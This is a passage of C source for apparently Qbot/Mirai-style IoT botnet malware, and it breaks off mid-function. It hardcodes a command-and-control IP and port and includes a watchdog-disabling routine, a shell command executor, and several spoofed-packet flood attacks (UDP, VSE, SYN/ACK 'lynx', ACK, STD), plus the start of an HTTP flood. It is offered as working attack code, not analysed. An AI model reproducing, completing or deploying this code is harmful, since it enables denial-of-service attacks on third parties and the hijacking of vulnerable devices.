#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(oxyHost1), sizeof(oxyHost2), sizeof(oxyHost3), sizeof(oxyHost4))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define OPT_SGA   3
#define PHI 0x9e3779b9
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define STD2_SIZE 200
#define BUFFER_SIZE 2048

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/huawei.h"
#include "headers/rand.h"
#include "headers/util.h"

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <dirent.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/select.h>
#include <time.h>

int oxyHost1 = {194};
int oxyHost2 = {248};
int oxyHost3 = {191};
int oxyHost4 = {41};
int oxyPort = 777;

const char *UserAgents[] = 
{
	"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
};

char *inet_ntoa(struct in_addr in);
int initConnection();
int sockprintf(int sock, char *formatStr, ...);
int oxyCommSock = 0, oxyServer = -1, userID = 1, watchdog_pid = 0;

uint32_t *pids;
uint32_t scanPid;
uint32_t ngPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};

static uint32_t Q[4096], c = 362436;

void makeRandomStr(unsigned char *buf, int length);

void watchdog_maintain(void)
{
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;

    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2);

    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1)
    {
		#ifdef DEBUG
			printf("[ioctl] found a driver on the device\n");
		#endif
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
			#ifdef DEBUG
                printf("[ioctl] sending keep-alive ioctl call to the driver\n");
            #endif
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);

    
    exit(0);
}

void init_rand(uint32_t x)
{
	int i;

	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

void trim(char *str)
{
	int i;
	int begin = 0;
	int end = strlen(str) - 1;

	while (isspace(str[begin])) begin++;

	while ((end >= begin) && isspace(str[end])) end--;
	for (i = begin; i <= end; i++) str[i - begin] = str[i];

	str[i - begin] = '\0';
}

uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (uint32_t)(t >> 32);
	x = t + c;
	if (x < c) 
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

void rand_alphastr(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }

char *makestring() 
{
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		rand_alphastr(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}

static void printchar(unsigned char **str, int c)
{
	if (str) 
	{
		**str = c;
		++(*str);
	}
	else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
	register int pc = 0, padchar = ' ';

	if (width > 0) 
	{
		register int len = 0;
		register const unsigned char *ptr;
		for (ptr = string; *ptr; ++ptr) ++len;
		if (len >= width) width = 0;
		else width -= len;
		if (pad & PAD_ZERO) padchar = '0';
	}
	if (!(pad & PAD_RIGHT)) 
	{
		for ( ; width > 0; --width) {
			printchar (out, padchar);
			++pc;
		}
	}
	for ( ; *string ; ++string) 
	{
		printchar (out, *string);
		++pc;
	}
	for ( ; width > 0; --width) 
	{
		printchar (out, padchar);
		++pc;
	}
	
	return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
	unsigned char print_buf[PRINT_BUF_LEN];
	register unsigned char *s;
	register int t, neg = 0, pc = 0;
	register unsigned int u = i;

	if (i == 0)
	{
		print_buf[0] = '0';
		print_buf[1] = '\0';
		return prints (out, print_buf, width, pad);
	}

	if (sg && b == 10 && i < 0) 
	{
		neg = 1;
		u = -i;
	}

	s = print_buf + PRINT_BUF_LEN-1;
	*s = '\0';

	while (u) 
	{
		t = u % b;
		if( t >= 10 )
		t += letbase - '0' - 10;
		*--s = t + '0';
		u /= b;
	}

	if (neg) 
	{
		if( width && (pad & PAD_ZERO) ) 
		{
			printchar (out, '-');
			++pc;
			--width;
		}
		else 
		{
			*--s = '-';
		}
	}
	return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
	register int width, pad;
	register int pc = 0;
	unsigned char scr[2];

	for (; *format != 0; ++format) 
	{
		if (*format == '%') 
		{
			++format;
			width = pad = 0;
			if (*format == '\0') break;
			if (*format == '%') goto out;
			if (*format == '-') 
			{
				++format;
				pad = PAD_RIGHT;
			}
			while (*format == '0') 
			{
				++format;
				pad |= PAD_ZERO;
			}
			for ( ; *format >= '0' && *format <= '9'; ++format) 
			{
				width *= 10;
				width += *format - '0';
			}
			if( *format == 's' ) 
			{
				register char *s = (char *)va_arg( args, intptr_t );
				pc += prints (out, s?s:"(null)", width, pad);
				continue;
			}
			if( *format == 'd' ) 
			{
				pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
				continue;
			}
			if( *format == 'x' ) 
			{
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'X' ) 
			{
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
				continue;
			}
			if( *format == 'u' ) 
			{
				pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'c' ) 
			{
				scr[0] = (unsigned char)va_arg( args, int );
				scr[1] = '\0';
				pc += prints (out, scr, width, pad);
				continue;
			}
		}
		else 
		{
			out:
				printchar (out, *format);
				++pc;
		}
	}
	if (out) **out = '\0';
	va_end( args );
	return pc;
}

int zprintf(const unsigned char *format, ...)
{
	va_list args;
	va_start( args, format );
	return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
	va_list args;
	va_start( args, format );
	return print( &out, format, args );
}

int sockprintf(int sock, char *formatStr, ...)
{
	unsigned char *textBuffer = malloc(2048);
	memset(textBuffer, 0, 2048);
	char *orig = textBuffer;
	va_list args;
	va_start(args, formatStr);
	print(&textBuffer, formatStr, args);
	va_end(args);
	orig[strlen(orig)] = '\n';
	//zprintf("buf: %s\n", orig);
	int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
	free(orig);
	return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
	register int iop;
	int pdes[2], fds, pid;

	if (*type != 'r' && *type != 'w' || type[1]) return -1;

	if (pipe(pdes) < 0) return -1;
	if (fdopen_pids == NULL) 
	{
		if ((fds = getdtablesize()) <= 0) return -1;
		if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
		memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
	}

	switch (pid = vfork())
	{
		case -1:
			close(pdes[0]);
			close(pdes[1]);
			return -1;
        case 0:
			if (*type == 'r') 
			{
				if (pdes[1] != 1) 
				{
					dup2(pdes[1], 1);
					close(pdes[1]);
				}
				close(pdes[0]);
			} 
			else 
			{
				if (pdes[0] != 0) 
				{
					(void) dup2(pdes[0], 0);
					(void) close(pdes[0]);
				}
				(void) close(pdes[1]);
			}
			execl("/bin/sh", "sh", "-c", program, NULL);
			_exit(127);
	}
	if (*type == 'r') 
	{
		iop = pdes[0];
		(void) close(pdes[1]);
	} 
	else 
	{
		iop = pdes[1];
		(void) close(pdes[0]);
	}
	fdopen_pids[iop] = pid;
	return (iop);
}

int fdpclose(int iop)
{
	register int fdes;
	sigset_t omask, nmask;
	int pstat;
	register int pid;

	if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
	(void) close(iop);
	sigemptyset(&nmask);
	sigaddset(&nmask, SIGINT);
	sigaddset(&nmask, SIGQUIT);
	sigaddset(&nmask, SIGHUP);
	(void) sigprocmask(SIG_BLOCK, &nmask, &omask);
	do 
	{
		pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
	} 
	while (pid == -1 && errno == EINTR);
	(void) sigprocmask(SIG_SETMASK, &omask, NULL);
	fdopen_pids[fdes] = 0;
	return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
	int got = 1, total = 0;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got == 0 ? NULL : buffer;
}

static const long hextable[] = {
	[0 ... 255] = -1,
	['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
	['A'] = 10, 11, 12, 13, 14, 15,
	['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char *hex)
{
	long ret = 0;
	while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
	return ret;
}

int wildString(const unsigned char* pattern, const unsigned char* string) 
{
	switch(*pattern)
	{
		case '\0': return *string;
		case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
		case '?': return !(*string && !wildString(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
	}
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
	struct hostent *h;
	if((i->s_addr = inet_addr(toGet)) == -1) return 1;
	return 0;
}

void uppercase(unsigned char *str)
{
	while(*str) { *str = toupper(*str); str++; }
}

void makeRandomStr(unsigned char *buf, int length)
{
	int i = 0;
	for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
	memset(buf, 0, bufsize);

	fd_set myset;
	struct timeval tv;
	tv.tv_sec = 30;
	tv.tv_usec = 0;
	FD_ZERO(&myset);
	FD_SET(socket, &myset);
	int selectRtn, retryCount;
	if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) 
	{
		while(retryCount < 10)
		{
			tv.tv_sec = 30;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(socket, &myset);
			if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) 
			{
				retryCount++;
				continue;
			}
			break;
		}
	}

	unsigned char tmpchr;
	unsigned char *cp;
	int count = 0;

	cp = buf;
	while(bufsize-- > 1)
	{
		if(recv(oxyCommSock, &tmpchr, 1, 0) != 1) 
		{
			*cp = 0x00;
			return -1;
		}
		*cp++ = tmpchr;
		if(tmpchr == '\n') break;
		count++;
	}
	*cp = 0x00;

	//zprintf("recv: %s\n", cp);

	return count;
}


int connectTimeout(int fd, char *host, int port, int timeout)
{
	struct sockaddr_in dest_addr;
	fd_set myset;
	struct timeval tv;
	socklen_t lon;

	int valopt;
	long arg = fcntl(fd, F_GETFL, NULL);
	arg |= O_NONBLOCK;
	fcntl(fd, F_SETFL, arg);

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if(getHost(host, &dest_addr.sin_addr)) return 0;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

	if (res < 0) 
	{
		if (errno == EINPROGRESS) 
		{
			tv.tv_sec = timeout;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(fd, &myset);
			if (select(fd+1, NULL, &myset, NULL, &tv) > 0) 
			{
				lon = sizeof(int);
				getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
				if (valopt) return 0;
			}
			else return 0;
		}
		else return 0;
	}

	arg = fcntl(fd, F_GETFL, NULL);
	arg &= (~O_NONBLOCK);
	fcntl(fd, F_SETFL, arg);

	return 1;
}

int listFork()
{
	uint32_t parent, *newpids, i;
	parent = fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids = (uint32_t*)malloc((numpids + 1) * 4);
	for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
	newpids[numpids - 1] = parent;
	free(pids);
	pids = newpids;
	return parent;
}

in_addr_t findRandIP(in_addr_t netmask)
{
	in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
	return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum(unsigned short *buf, int count)
{
	register uint64_t sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{
	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} 
	pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + packetSize;
	iph->id = rand_cmwc();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = protocol;
	iph->check = 0;
	iph->saddr = source;
	iph->daddr = dest;
}

void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
	char *vse_payload;
    int vse_payload_len;
	vse_payload = "TSource Engine Query", &vse_payload_len;
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
	iph->id = rand_cmwc();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = protocol;
	iph->check = 0;
	iph->saddr = source;
	iph->daddr = dest;
}

void udpflood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	register unsigned int pollRegister;
	pollRegister = pollinterval;
	if(spoofit == 32) 
	{
		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if(!sockfd) 
		{
			return;
		}
		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
		if(buf == NULL) return;
		memset(buf, 0, packetsize + 1);
		makeRandomStr(buf, packetsize);
		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		register unsigned int ii = 0;
		while(1) 
		{
			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
			if(i == pollRegister) 
			{
				if(port == 0) dest_addr.sin_port = rand_cmwc();
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
			if(ii == sleepcheck) 
			{
				usleep(sleeptime*1000);
				ii = 0;
				continue;
			}
			ii++;
		}
	} 
	else 
	{
		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if(!sockfd) 
		{
			return;
		}
		int tmp = 1;
		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) 
		{
			return;
		}
		int counter = 50;
		while(counter--) 
		{
			srand(time(NULL) ^ rand_cmwc());
			init_rand(rand());
		}
		in_addr_t netmask;
		if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
		else netmask = ( ~((1 << (32 - spoofit)) - 1) );
		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
		struct iphdr *iph = (struct iphdr *)packet;
		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
		makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
		udph->len = htons(sizeof(struct udphdr) + packetsize);
		udph->source = rand_cmwc();
		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
		udph->check = 0;
		makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);
		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		register unsigned int ii = 0;
		while(1) 
		{
			sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
			udph->source = rand_cmwc();
			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
			iph->id = rand_cmwc();
			iph->saddr = htonl( findRandIP(netmask) );
			iph->check = csum ((unsigned short *) packet, iph->tot_len);
			if(i == pollRegister) 
			{
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
			if(ii == sleepcheck) 
			{
				usleep(sleeptime*1000);
				ii = 0;
				continue;
			}
			ii++;
		}
	}
}

void vseflood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
	char *vse_payload;
	int vse_payload_len;
	vse_payload = "TSource Engine Query", &vse_payload_len;
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	register unsigned int pollRegister;
	pollRegister = pollinterval;
	if(spoofit == 32) 
	{
		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if(!sockfd) 
		{
			return;
		}
		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
		if(buf == NULL) return;
		memset(buf, 0, packetsize + 1);
		makeRandomStr(buf, packetsize);
		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		register unsigned int ii = 0;
		while(1) 
		{
			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
			if(i == pollRegister) 
			{
				if(port == 0) dest_addr.sin_port = rand_cmwc();
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
			if(ii == sleepcheck) 
			{
				usleep(sleeptime*1000);
				ii = 0;
				continue;
			}
			ii++;
		}
	} 
	else 
	{
		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if(!sockfd) 
		{
			return;
		}
		int tmp = 1;
		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) 
		{
			return;
		}
		int counter = 50;
		while(counter--) 
		{
			srand(time(NULL) ^ rand_cmwc());
			init_rand(rand());
		}
		in_addr_t netmask;
		if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
		else netmask = ( ~((1 << (32 - spoofit)) - 1) );
		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
		struct iphdr *iph = (struct iphdr *)packet;
		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
		makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
		udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
		udph->source = rand_cmwc();
		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
		udph->check = 0;
		udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
		makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);
		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		register unsigned int ii = 0;
		while(1) 
		{
			sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
			udph->source = rand_cmwc();
			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
			iph->id = rand_cmwc();
			iph->saddr = htonl( findRandIP(netmask) );
			iph->check = csum ((unsigned short *) packet, iph->tot_len);
			if(i == pollRegister) 
			{
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
			if(ii == sleepcheck) 
			{
				usleep(sleeptime*1000);
				ii = 0;
				continue;
			}
			ii++;
		}
	}
}

void lynxflood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
	register unsigned int pollRegister;
	pollRegister = pollinterval;

	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!sockfd)
	{
		return;
	}

	int tmp = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
	{
		return;
	}

	in_addr_t netmask;

	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
	else netmask = ( ~((1 << (32 - spoofit)) - 1) );

	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

	tcph->source = rand_cmwc();
	tcph->seq = rand_cmwc();
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->ack = 1;
	tcph->syn = 1;
	tcph->psh = 1;
	tcph->ack = 1;
	tcph->urg = 1;
	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
	tcph->check = tcpcsum(iph, tcph);

	iph->check = csum ((unsigned short *) packet, iph->tot_len);

	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	while(1)
	{
		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

		iph->saddr = htonl( findRandIP(netmask) );
		iph->id = rand_cmwc();
		tcph->seq = rand_cmwc();
		tcph->source = rand_cmwc();
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);

		if(i == pollRegister)
		{
			if(time(NULL) > end) break;
			i = 0;
			continue;
		}
		i++;
	}
}

void ackflood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
	register unsigned int pollRegister;
	pollRegister = pollinterval;

	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!sockfd)
	{
		return;
	}

	int tmp = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
	{
		return;
	}

	in_addr_t netmask;

	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
	else netmask = ( ~((1 << (32 - spoofit)) - 1) );

	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

	tcph->source = rand_cmwc();
	tcph->seq = rand_cmwc();
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->ack = 1;
	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
	tcph->check = tcpcsum(iph, tcph);
	
	iph->check = csum ((unsigned short *) packet, iph->tot_len);

	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	while(1)
	{
		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

		iph->saddr = htonl( findRandIP(netmask) );
		iph->id = rand_cmwc();
		tcph->seq = rand_cmwc();
		tcph->source = rand_cmwc();
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);

		if(i == pollRegister)
		{
				if(time(NULL) > end) break;
				i = 0;
				continue;
		}
		i++;
	}
}

void stdflood(unsigned char *ip, int port, int secs) 
{
	int iSTD_Sock;
	iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent * hp;
	hp = gethostbyname(ip);
	bzero((char * ) & sin, sizeof(sin));
	bcopy(hp->h_addr, (char * ) & sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while (1) 
	{
		if (a >= 50) 
		{
			char name_buf[1024];
			rand_alphastr(name_buf);
			char *stdstring = name_buf;
			send(iSTD_Sock, stdstring, STD2_SIZE, 0);
			connect(iSTD_Sock, (struct sockaddr * ) & sin, sizeof(sin));
			if (time(NULL) >= start + secs) 
			{
				close(iSTD_Sock);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}

int socket_connect(char *host, in_port_t port) 
{
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, 0);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}

void httphex(char *method, char *host, in_port_t port, int timeEnd, int power)
{
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char hexbuffer[1024];
	char request[512], buffer[1];
